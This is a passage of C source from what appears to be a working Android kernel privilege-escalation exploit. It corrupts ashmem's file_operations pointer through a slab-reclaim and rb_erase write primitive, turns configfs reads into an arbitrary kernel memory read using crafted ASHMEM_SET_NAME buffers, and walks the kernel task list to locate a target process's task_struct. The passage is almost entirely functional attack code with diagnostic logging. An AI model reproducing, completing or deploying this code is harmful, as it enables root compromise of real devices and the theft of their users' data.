     * later vehicle sometimes, so scan all of them. */
    unsigned char *rb = malloc(ORDER2_SIZE);
    if (rb) {
      uint64_t hit_pc = 0, hit_read = 0;
      int hit_i = -1;
      for (int i = 0; i < skb_vehicles_used; i++) {
        if (skb_sv[i][1] < 0) continue;
        memset(rb, 0, ORDER2_SIZE);
        ssize_t n = recv(skb_sv[i][1], rb, (size_t)skb_send_size, MSG_PEEK);
        if (n <= 0) continue;
        uint64_t pc;
        memcpy(&pc, rb + FOPS_OFF, 8);
        if (pc == ((uint64_t)((target - 8) | 1))) {
          memcpy(&hit_read, rb + FOPS_OFF + FOPS_READ_OFF, 8);
          hit_pc = pc; hit_i = i;
          break;
        }
      }
      pr_info("install_fake_fops DIAG: write#2 %s (vehicle %d, child_pc=0x%016llx "
              "read=0x%016llx exp_read=0x%016llx)\n",
              hit_i >= 0 ? "LANDED" : "MISSED", hit_i,
              (unsigned long long)hit_pc, (unsigned long long)hit_read,
              (unsigned long long)text_addr(KIMAGE_TEXT_BASE +
                                            CFI_CONFIGFS_READ_BIN_OFF));
      free(rb);
    }
  }
  /* DIAG: read /proc/misc. If write#1 landed at target+8 (asmhem_misc.list.next)
   * instead of target+0 (fops), the misc_list is corrupted and this read will
   * crash/hang in the kernel's misc_seq_show. */
  {
    FILE *mf = fopen("/proc/misc", "r");
    if (mf) {
      char lb[128];
      int n = 0;
      while (fgets(lb, sizeof(lb), mf) && n < 4) {
        size_t l = strlen(lb);
        while (l && (lb[l-1]=='\n' || lb[l-1]=='\r')) lb[--l]=0;
        pr_info("proc/misc: %s\n", lb);
        n++;
      }
      fclose(mf);
      pr_info("proc/misc read OK (%d lines)\n", n);
    } else {
      pr_warning("proc/misc open failed errno=%d\n", errno);
    }
  }
  /* REFCNT FIX: try_module_get(owner) reads refcnt @ owner+0x3c8 = a u32 at
   * 0x29bcf81 that is 0 at runtime, which makes fops_get fail and the open
   * return -ENODEV. Do a SECOND rb_erase write (fresh reclaimed page) that
   * stores a valid address there so refcnt != 0 and the open succeeds. */
  {
    uintptr_t refcnt_target = data_addr(KIMAGE_TEXT_BASE + REFCNT_FIX_OFF);
    if (!prepare_good_kernel_page()) return 0;
    pselect_child_node = 1;
    set_pselect_write_mode(refcnt_target, page_base + SAFE_OFF, 4);
    run_main_route_threads();
    clear_pselect_write();
    pr_info("install_fake_fops: refcnt fix wrote 0x%016zx to 0x%016zx\n",
            page_base + SAFE_OFF, refcnt_target);
  }

  /* NOTE: do NOT cleanup here — the fake fops table lives in the reclaimed
   * SKB slab and must STAY allocated while /dev/ashmem routes through it. */
  return 1;
}

/* v9.32 install via write#2 (mode 5). The write#1 -> target+0/target+8 store
 * is unreliable for ashmem_misc.fops (static analysis says it must hit fops,
 * but empirically the open shows the ORIGINAL fops still installed — i.e.
 * write#1 hit list.next == node). mode 5 instead uses the rb_erase child->pc
 * fixup: write_value = fops_field (the real fops address), tree_pc = fake_fops
 * (COLOR 0), so write#2 stores fake_fops directly into ashmem_misc.fops.
 * fake_fops->owner stays NULL -> try_module_get(NULL)==true -> open succeeds
 * with no refcnt fix. write#1 = fops_field lands in fake_fops->llseek (benign;
 * the read path never calls llseek). */
int install_fake_fops_v2(uintptr_t fops_field) {
  page_base = prepare_good_kernel_page();
  if (!page_base) return 0;
  pselect_child_node = 1;
  /* write_target = fake_fops + 8 so tree_pc (color 0) == fake_fops */
  set_pselect_write_mode(fake_fops + 8, fops_field, 5);
  run_main_route_threads();
  clear_pselect_write();
  /* DIAG: write#1 = fops_field lands in fake_fops->llseek slot (the only
   * sprayed-page observable; write#2 lands in the REAL fops field). write#2
   * is INDEPENDENT of the reclaim (it stores tree_pc=fake_fops into the
   * GLOBAL fops_field), so it ALWAYS lands — even when the reclaim failed and
   * fake_fops is a stale freed-slab pointer. write#1 landing in the sprayed
   * page is therefore the ONLY reliable signal that the reclaim succeeded and
   * the fake_fops table is actually populated; gate the return on it so the
   * caller does not open /dev/ashmem through a garbage fops. */
  {
    unsigned char *rb = malloc(ORDER2_SIZE);
    int hit_i = -1;
    if (rb) {
      uint64_t hit_llseek = 0;
      int sampled = 0;
      for (int i = 0; i < skb_vehicles_used; i++) {
        if (skb_sv[i][1] < 0) continue;
        memset(rb, 0, ORDER2_SIZE);
        ssize_t n = recv(skb_sv[i][1], rb, (size_t)skb_send_size, MSG_PEEK);
        if (n <= 0) continue;
        uint64_t ll;
        memcpy(&ll, rb + FOPS_OFF + FOPS_LLSEEK_OFF, 8);
        if (ll == fops_field) { hit_llseek = ll; hit_i = i; break; }
        /* v9.40 DIAG: dump the first 3 vehicles' actual bytes so we can tell
         * apart "reclaim failed (pristine SKB)" vs "write#1 landed elsewhere"
         * vs "MSG_PEEK truncated". */
        if (sampled < 3) {
          uint64_t read_slot, scratch, safe;
          memcpy(&read_slot, rb + FOPS_OFF + FOPS_READ_OFF, 8);
          memcpy(&scratch, rb + SCRATCH_OFF, 8);
          memcpy(&safe, rb + SAFE_OFF, 8);
          pr_info("  DIAG veh[%d] n=%zd llseek=0x%016llx read=0x%016llx "
                  "scratch=0x%016llx safe=0x%016llx\n",
                  i, n, (unsigned long long)ll, (unsigned long long)read_slot,
                  (unsigned long long)scratch, (unsigned long long)safe);
          sampled++;
        }
      }
      pr_info("install_fake_fops_v2 DIAG: write#1 %s (vehicle %d, llseek=0x%016llx exp=0x%016llx)\n",
              hit_i >= 0 ? "LANDED" : "MISSED", hit_i,
              (unsigned long long)hit_llseek, (unsigned long long)fops_field);
      free(rb);
    }
    return hit_i >= 0 ? 1 : 0;
  }
}

/* configfs_read_once via configfs_read_BIN_file (bin_buffer @ 0x58). Needs
 * mutex@0x20 = 0, needs_read_fill@0x50 = 0, byte@0x55 = 0, bin_buffer@0x58 =
 * target, bin_buffer_size@0x60 = len. */
static int ashmem_set_name_bin_blob(int fd, uintptr_t target, size_t len) {
  char name[ASHMEM_NAME_LEN];
  /* full blob: name[21..28]=mutex@0x20 owner, name[69..72]=needs_read_fill,
   * name[74]=0x55-byte, name[77..84]=bin_buffer, name[85]=bin_buffer_size
   * byte0, name[86]=NUL. */
  memset(name, 0x41, sizeof(name));
  name[21] = name[22] = name[23] = name[24] = 0x01;
  name[25] = name[26] = name[27] = name[28] = 0x01;
  name[69] = name[70] = name[71] = name[72] = 0x01;
  name[74] = 0x01;
  memcpy(name + 77, &target, sizeof(target));
  name[85] = (unsigned char)len;
  name[86] = 0;
  if (ioctl(fd, ASHMEM_SET_NAME, name) != 0) return -1;
  static const int zero_pos[13] = {74, 72, 71, 70, 69, 28, 27, 26, 25, 24, 23, 22, 21};
  for (int k = 0; k < 13; k++) {
    memset(name, 0x41, sizeof(name));
    name[zero_pos[k]] = 0;
    if (ioctl(fd, ASHMEM_SET_NAME, name) != 0) return -1;
  }
  return 0;
}

/* configfs_read_once via configfs_read_FILE (page @ 0x10). Needs mutex@0x20=0,
 * needs_read_fill@0x50=0, page@0x10=target. count@0x00 is the fixed
 * "dev/ashm" prefix (huge) so simple_read_from_buffer's available>=len always
 * holds. page@0x10 = name[5..12], terminator name[13]=0 -> strlcpy copies 13
 * bytes and never reaches mutex (name[21..28]) or needs_read_fill (name[69..72]),
 * which stay 0 from the fresh kzalloc across every read — no zeroing passes. */
static int ashmem_set_name_read_blob(int fd, uintptr_t target) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  memcpy(name + 5, &target, sizeof(target));
  name[13] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name) == 0 ? 0 : -1;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  int ok = env_flag("GL_BIN_FILE", 0)
               ? ashmem_set_name_bin_blob(fd, target, len)
               : ashmem_set_name_read_blob(fd, target);
  if (ok != 0) {
    pr_warning("configfs_read: set_name blob failed errno=%d\n", errno);
    return -1;
  }
  pr_info("configfs_read: blob OK, about to pread\n");
  errno = 0;
  ssize_t r = pread(fd, data, len, 0);
  pr_info("configfs_read target=0x%zx len=%zu -> r=%zd errno=%d\n",
          target, len, r, errno);
  return r;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t v = 0;
  if (configfs_read_once(fd, target, &v, sizeof(v)) != (ssize_t)sizeof(v)) return 0;
  return v;
}

/* Read len contiguous bytes from kernel target via configfs. Returns bytes read
 * or 0. */
static ssize_t kernel_read_buf(int fd, uintptr_t target, void *buf, size_t len) {
  memset(buf, 0, len);
  if (configfs_read_once(fd, target, buf, len) != (ssize_t)len) return 0;
  return (ssize_t)len;
}

/* Walk init_task.tasks (list_head) in a given direction to find want_tgid.
 * One 0x110-byte chunk per candidate covers tasks.next@0, tasks.prev@8,
 * pid@0x100, tgid@0x104, so each step is a SINGLE configfs read (vs 2
 * kernel_read64 in the old forward walk). */
#define TASK_CHUNK_SPAN 0x110
static uintptr_t walk_tasks(int fd, uintptr_t head, uint32_t want_tgid, int backward) {
  unsigned char chunk[TASK_CHUNK_SPAN];
  if (kernel_read_buf(fd, head, chunk, 0x10) != 0x10) return 0;
  uint64_t entry;
  memcpy(&entry, chunk + (backward ? 8 : 0), 8);
  int steps = 0;
  for (int i = 0; i < 4096; i++) {
    if (!entry || entry == head) return 0;
    /* reject non-canonical-kernel pointers (0x00-truncation produces 0x41-fill
     * or partially-zeroed garbage instead of a real 0xffff... address) */
    if ((entry & 0xffff000000000000ULL) != 0xffff000000000000ULL) return 0;
    if (kernel_read_buf(fd, (uintptr_t)entry, chunk, sizeof(chunk)) !=
        (ssize_t)sizeof(chunk)) {
      pr_warning("find_task: chunk read failed @0x%llx (step %d, %s)\n",
                 (unsigned long long)entry, steps, backward ? "back" : "fwd");
      return 0;
    }
    uintptr_t task = (uintptr_t)entry - TASK_TASKS_OFF;
    uint32_t tgid;
    memcpy(&tgid, chunk + (TASK_TGID_OFF - TASK_TASKS_OFF), 4);
    if (tgid == want_tgid) {
      pr_info("find_task_by_tgid: tgid=%u at task=0x%zx (%d steps, %s)\n",
              want_tgid, task, steps, backward ? "back" : "fwd");
      return task;
    }
    memcpy(&entry, chunk + (backward ? 8 : 0), 8);
    steps++;
  }
  return 0;
}

/* Find the task by tgid. Our target child is forked immediately before this
 * call, so it sits at/near the list tail (init_task.tasks.prev) — walk BACKWARD
 * first (a few steps instead of the ~1000-read forward walk, keeping the
 * global-fake-fops window to ~10 reads and minimising the concurrent-process
 * panic). Fall back to a forward walk if the backward pass is corrupted. */
uintptr_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uintptr_t head = data_addr(INIT_TASK + TASK_TASKS_OFF);  /* &init_task.tasks */
  uintptr_t task = walk_tasks(fd, head, want_tgid, 1);
  if (task) return task;
  pr_warning("find_task: backward walk failed, trying forward\n");
  return walk_tasks(fd, head, want_tgid, 0);
}
